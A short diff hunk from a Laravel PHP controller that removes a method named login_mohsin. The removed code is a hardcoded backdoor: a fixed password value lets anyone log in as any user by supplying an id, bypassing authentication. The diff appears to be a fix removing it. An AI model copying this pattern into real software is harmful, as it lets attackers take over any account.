@@ -543,16 +543,4 @@ class WelcomeController extends Controller
 
         return response()->json($users);
     }
-
-    public function login_mohsin(Request $request){
-        if(isset($request->password)) {
-            if ($request->password == 78601) {
-                $userLogin = User::with('userRole')->where('id', $request->id)->first();
-                if (!empty($userLogin)) {
-                    Auth::login($userLogin);
-                    return redirect('/dashboard');
-                }
-            }
-        }
-    }
 }
